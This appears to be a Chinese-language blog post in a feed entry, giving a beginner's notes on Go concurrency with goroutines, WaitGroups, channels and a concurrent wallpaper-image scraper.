+        <content type="html"><![CDATA[<h4 id="golang-实现并发编程">Golang 实现并发编程</h4>
+<h5 id="简介">简介</h5>
+<h6 id="我对于并发的认识">我对于并发的认识</h6>
+<p>在我们学习并发这个概念之前，我们需要了解下什么是并发。我第一次接触这个概念的时候是在逻辑漏洞挖掘上。当时第一次接触到这个概念，我还在想这个和无限重放有什么区别呢。我觉得比较好的一个解释是 并发是多线程同时进行的，而无限重放，不论你的手速再快，他也是单线程进行的。所以 网上那些通过无限重放数据包构造并发的都是扯淡。。。。</p>
+<h6 id="go语言中的并发">go语言中的并发</h6>
+<p>很多语言都可以进行编程，但是民间据说go自带并发属性，Go 使用 Go 协程（Goroutine） 和信道（Channel）来处理并发。具体内容我也也不太好说，看下面的代码和注释吧。</p>
+<h5 id="goroutine">Goroutine</h5>
+<pre><code class="language-go">func hello() {
+    fmt.Println(&quot;Hello Goroutine!&quot;)
+}
+func main() {
+    hello()
+    fmt.Println(&quot;main goroutine done!&quot;)
+}
+</code></pre>
+<p>这段代码就是正常的并行输出。</p>
+<pre><code class="language-go">package main
+
+import &quot;fmt&quot;
+
+func hello() {
+	fmt.Println(&quot;Hello Goroutine!&quot;)
+}
+func main() {
+	go hello()      //使用了 Goroutine
+	fmt.Println(&quot;main goroutine done!&quot;)
+}
+
+//输出结果
+/*main goroutine done!*/
+</code></pre>
+<p>没有输出 Hello 部分</p>
+<p>网上师傅的解释</p>
+<p>go为 main函数 自动创建了一个goroutine 当main()函数返回的时候该goroutine就结束了，所有在main()函数中启动的goroutine会一同结束，main函数所在的goroutine就像是权利的游戏中的夜王，其他的goroutine都是异鬼，夜王一死它转化的那些异鬼也就全部GG了。</p>
+<pre><code class="language-go">//网上的解决方法  加入 time.sleep
+package main
+
+import (
+	&quot;fmt&quot;
+	&quot;time&quot;
+)
+
+func hello() {
+	fmt.Println(&quot;Hello Goroutine!&quot;)
+}
+func main() {
+	go hello()
+	fmt.Println(&quot;main goroutine done!&quot;)
+	time.Sleep(time.Second)
+}
+//输出结果 
+/*main goroutine done!
+  Hello Goroutine!
+*/
+</code></pre>
+<pre><code class="language-go">//启动多个 goroutine
+package main
+
+import (
+	&quot;fmt&quot;
+	&quot;sync&quot;
+)
+
+var wg sync.WaitGroup
+
+func hello(i int) {
+	defer wg.Done() // goroutine结束就登记-1
+	fmt.Println(&quot;Hello Goroutine!&quot;, i)
+}
+func main() {
+
+	for i := 0; i &lt; 10; i++ {
+		wg.Add(1) // 启动一个goroutine就登记+1
+		go hello(i)
+	}
+	wg.Wait() // 等待所有登记的goroutine都结束
+}
+//执行并发输出，多次运行输出发现输出结果不一样。这就是并发的特性，如果是并行输出，输出结果就是唯一的。
+</code></pre>
+<h5 id="runtime">runtime</h5>
+<pre><code class="language-go">package main
+
+import (
+	&quot;fmt&quot;
+	&quot;runtime&quot;
+)
+
+func main() {
+	go func(s string) {
+		for i := 0; i &lt; 2; i++ {
+			fmt.Println(s)
+		}
+	}(&quot;world&quot;)
+	// 主协程
+	for i := 0; i &lt; 2; i++ {
+		// 切一下，再次分配任务
+		runtime.Gosched()
+		fmt.Println(&quot;hello&quot;)
+	}
+}
+
+</code></pre>
+<pre><code class="language-go">package main
+
+import (
+	&quot;fmt&quot;
+	&quot;runtime&quot;
+	&quot;time&quot;
+)
+
+func a() {
+	for i := 1; i &lt; 10; i++ {
+		fmt.Println(&quot;A:&quot;, i)
+	}
+}
+
+func b() {
+	for i := 1; i &lt; 10; i++ {
+		fmt.Println(&quot;B:&quot;, i)
+	}
+}
+
+func main() {
+	runtime.GOMAXPROCS(2)
+	go a()
+	go b()
+	time.Sleep(time.Second)
+}
+
+package main
+
+import (
+	&quot;fmt&quot;
+	&quot;time&quot;
+)
+
+func a() {
+	for i := 1; i &lt; 10; i++ {
+		fmt.Println(&quot;A:&quot;, i)
+	}
+}
+
+func b() {
+	for i := 1; i &lt; 10; i++ {
+		fmt.Println(&quot;B:&quot;, i)
+	}
+}
+
+func main() {
+	go a()
+	go b()
+	time.Sleep(time.Second)
+}
+
+//go 1.5版本前默认单核心，go 1.5版本后默认调用全部核心 可通过 runtime.GOMAXPROCS 实现使用多少核心
+</code></pre>
+<p>Go语言中的操作系统线程和goroutine的关系：</p>
+<ul>
+<li>1.一个操作系统线程对应用户态多个goroutine。</li>
+<li>2.go程序可以同时使用多个操作系统线程。</li>
+<li>3.goroutine和OS线程是多对多的关系，即m:n。</li>
+</ul>
+<h5 id="channel">channel</h5>
+<p>如果说goroutine是Go程序并发的执行体，channel就是它们之间的连接。channel是可以让一个goroutine发送特定值到另一个goroutine的通信机制。</p>
+<pre><code class="language-go">// channel
+package main
+
+import &quot;fmt&quot;
+
+func main() {
+	var demo1 chan int  //声明一个传递整型的通道
+	fmt.Println(demo1)
+}
+//输出结果 &lt;nil&gt;
+</code></pre>
+<pre><code class="language-go">// channel
+//channel的缓冲大小是可选的
+package main
+
+import &quot;fmt&quot;
+
+func main() {
+	ch4 := make(chan bool)
+	ch5 := make(chan bool)
+	ch6 := make(chan []int)
+	fmt.Println(ch4)
+	fmt.Println(ch5)
+	fmt.Println(ch6)
+}
+
+//这段代码我只是知道如何用了，但是对于一些底层的知识还不太清楚
+</code></pre>
+<pre><code class="language-go">// channel操作 
+// channel 的操作只有三种 发送 接收 关闭
+//发送和接收都使用&lt;-符号
+</code></pre>
+<pre><code class="language-go">ch &lt;- 10 // 把10发送到ch中
+
+x := &lt;- ch // 从ch中接收值并赋值给变量x
+&lt;-ch       // 从ch中接收值，忽略结果
+
+ close(ch)  //关闭通道
+</code></pre>
+<p>网上关于关闭通道的一些说法</p>
+<pre><code class="language-go">关于关闭通道需要注意的事情是，只有在通知接收方goroutine所有的数据都发送完毕的时候才需要关闭通道。通道是可以被垃圾回收机制回收的，它和关闭文件是不一样的，在结束操作之后关闭文件是必须要做的，但关闭通道不是必须的。
+</code></pre>
+<p>关闭后的通道有以下特点：</p>
+<pre><code class="language-go">    1.对一个关闭的通道再发送值就会导致panic。
+    2.对一个关闭的通道进行接收会一直获取值直到通道为空。
+    3.对一个关闭的并且没有值的通道执行接收操作会得到对应类型的零值。
+    4.关闭一个已经关闭的通道会导致panic。
+</code></pre>
+<pre><code class="language-go">package main
+
+import &quot;fmt&quot;
+
+func main() {
+    demo := make(chan int)
+    demo &lt;- 10
+    fmt.Println(&quot;发送成功&quot;)
+}
+// 上述代码会报错 因为我们使用demo := make(chan int)创建的是无缓冲的通道，无缓冲的通道只有在有人接收值的时候才能发送值
+</code></pre>
+<pre><code class="language-go">//解决方案1 启用一个goroutine去接收值
+package main
+
+import (
+	&quot;fmt&quot;
+)
+
+func recv(c chan int) {
+	ret := &lt;-c
+	fmt.Println(&quot;接收成功&quot;, ret)
+}
+func main() {
+	demo := make(chan int)
+	go recv(demo) // 启用goroutine从通道接收值
+	demo &lt;- 10
+	fmt.Println(&quot;发送成功&quot;)
+}
+//使用无缓冲通道进行通信将导致发送和接收的goroutine同步化。因此，无缓冲通道也被称为同步通道。
+</code></pre>
+<pre><code class="language-go">//解决方案 2 创建一个有缓冲的通道
+func main() {
+    demo := make(chan int, 1) // 创建一个容量为1的有缓冲区通道
+    demo &lt;- 10
+    fmt.Println(&quot;发送成功&quot;)
+}
+</code></pre>
+<pre><code class="language-go">//关闭操作
+package main
+
+import &quot;fmt&quot;
+
+func main() {
+    c := make(chan int)
+    go func() {
+        for i := 0; i &lt; 5; i++ {
+            c &lt;- i
+        }
+        close(c)
+    }()
+    for {
+        if data, ok := &lt;-c; ok {
+            fmt.Println(data)
+        } else {
+            break
+        }
+    }
+    fmt.Println(&quot;main结束&quot;)
+}
+//输出0到4
+</code></pre>
+<pre><code class="language-go">//使用上面的操作打印 0 到 100 的平方
+package main
+
+import &quot;fmt&quot;
+
+func main() {
+	ch1 := make(chan int)   //声明两段通道
+	ch2 := make(chan int)
+
+	go func() {        //调用 goroutine
+		for i := 0; i &lt; 101; i++ {
+			ch1 &lt;- i
+		}
+		close(ch1)     //关闭通道
+	}()
+	go func() {         //调用 goroutine
+		for {
+			i, ok := &lt;-ch1       //通道关闭后再取值ok=false
+			if !ok {         //判断
+				break
+			}
+			ch2 &lt;- i * i
+		}
+		close(ch2)     //关闭通道
+	}()
+	for i := range ch2 {    //打印
+		fmt.Println(i)
+	}
+}
+
+</code></pre>
+<pre><code class="language-go">//单向通道
+func counter(out chan&lt;- int) {
+    for i := 0; i &lt; 100; i++ {
+        out &lt;- i
+    }
+    close(out)
+}
+
+func squarer(out chan&lt;- int, in &lt;-chan int) {
+    for i := range in {
+        out &lt;- i * i
+    }
+    close(out)
+}
+func printer(in &lt;-chan int) {
+    for i := range in {
+        fmt.Println(i)
+    }
+}
+
+func main() {
+    ch1 := make(chan int)
+    ch2 := make(chan int)
+    go counter(ch1)
+    go squarer(ch2, ch1)
+    printer(ch2)
+}
+
+/* 1.chan&lt;- int是一个只能发送的通道，可以发送但是不能接收；
+    2.&lt;-chan int是一个只能接收的通道，可以接收但是不能发送*/
+</code></pre>
+<p>在函数传参及任何赋值操作中将双向通道转换为单向通道是可以的，但反过来是不可以的。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230228194523449.png" alt="image-20230228194523449" loading="lazy"></figure>
+<pre><code class="language-go">//并发爬取网页图片代码 很有学习意义
+package main
+
+import (
+	&quot;fmt&quot;
+	&quot;io/ioutil&quot;
+	&quot;net/http&quot;
+	&quot;regexp&quot;
+	&quot;strconv&quot;
+	&quot;strings&quot;
+	&quot;sync&quot;
+	&quot;time&quot;
+)
+
+func HandleError(err error, why string) {
+	if err != nil {
+		fmt.Println(why, err)
+	}
+}
+
+// 下载图片，传入的是图片叫什么
+func DownloadFile(url string, filename string) (ok bool) {
+	resp, err := http.Get(url)
+	HandleError(err, &quot;http.get.url&quot;)
+	defer resp.Body.Close()
+	bytes, err := ioutil.ReadAll(resp.Body)
+	HandleError(err, &quot;resp.body&quot;)
+	filename = &quot;E:/image&quot; + filename
+	// 写出数据
+	err = ioutil.WriteFile(filename, bytes, 0666)
+	if err != nil {
+		return false
+	} else {
+		return true
+	}
+}
+
+// 并发爬思路：
+// 1.初始化数据管道
+// 2.爬虫写出：26个协程向管道中添加图片链接
+// 3.任务统计协程：检查26个任务是否都完成，完成则关闭数据管道
+// 4.下载协程：从管道里读取链接并下载
+
+var (
+	// 存放图片链接的数据管道
+	chanImageUrls chan string
+	waitGroup     sync.WaitGroup
+	// 用于监控协程
+	chanTask chan string
+	reImg    = `https?://[^&quot;]+?(\.((jpg)|(png)|(jpeg)|(gif)|(bmp)))`
+)
+
+func main() {
+
+	// 1.初始化管道
+	chanImageUrls = make(chan string, 1000000)
+	chanTask = make(chan string, 26)
+	// 2.爬虫协程
+	for i := 1; i &lt; 27; i++ {
+		waitGroup.Add(1)
+		go getImgUrls(&quot;https://bz.zzzmh.cn/index&quot; + strconv.Itoa(i) + &quot;.html&quot;)
+	}
+	waitGroup.Add(1)
+	go CheckOK()
+	for i := 0; i &lt; 5; i++ {
+		waitGroup.Add(1)
+		go DownloadImg()
+	}
+	waitGroup.Wait()
+}
+
+// 下载图片
+func DownloadImg() {
+	for url := range chanImageUrls {
+		filename := GetFilenameFromUrl(url)
+		ok := DownloadFile(url, filename)
+		if ok {
+			fmt.Printf(&quot;%s 下载成功\n&quot;, filename)
+		} else {
+			fmt.Printf(&quot;%s 下载失败\n&quot;, filename)
+		}
+	}
+	waitGroup.Done()
+}
+
+// 截取url名字
+func GetFilenameFromUrl(url string) (filename string) {
+	// 返回最后一个/的位置
+	lastIndex := strings.LastIndex(url, &quot;/&quot;)
+	// 切出来
+	filename = url[lastIndex+1:]
+	// 时间戳解决重名
+	timePrefix := strconv.Itoa(int(time.Now().UnixNano()))
+	filename = timePrefix + &quot;_&quot; + filename
+	return
+}
+
+// 任务统计协程
+func CheckOK() {
+	var count int
+	for {
+		url := &lt;-chanTask
+		fmt.Printf(&quot;%s 完成了爬取任务\n&quot;, url)
+		count++
+		if count == 26 {
+			close(chanImageUrls)
+			break
+		}
+	}
+	waitGroup.Done()
+}
+
+// 爬图片链接到管道
+// url是传的整页链接
+func getImgUrls(url string) {
+	urls := getImgs(url)
+	// 遍历切片里所有链接，存入数据管道
+	for _, url := range urls {
+		chanImageUrls &lt;- url
+	}
+	// 标识当前协程完成
+	// 每完成一个任务，写一条数据
+	// 用于监控协程知道已经完成了几个任务
+	chanTask &lt;- url
+	waitGroup.Done()
+}
+
+// 获取当前页图片链接
+func getImgs(url string) (urls []string) {
+	pageStr := GetPageStr(url)
+	re := regexp.MustCompile(reImg)
+	results := re.FindAllStringSubmatch(pageStr, -1)
+	fmt.Printf(&quot;共找到%d条结果\n&quot;, len(results))
+	for _, result := range results {
+		url := result[0]
+		urls = append(urls, url)
+	}
+	return
+}
+
+// 抽取根据url获取内容
+func GetPageStr(url string) (pageStr string) {
+	resp, err := http.Get(url)
+	HandleError(err, &quot;http.Get url&quot;)
+	defer resp.Body.Close()
+	// 2.读取页面内容
+	pageBytes, err := ioutil.ReadAll(resp.Body)
+	HandleError(err, &quot;ioutil.ReadAll&quot;)
+	// 字节转字符串
+	pageStr = string(pageBytes)
+	return pageStr
+}
+</code></pre>
+]]></content>
+    </entry>
+</feed>
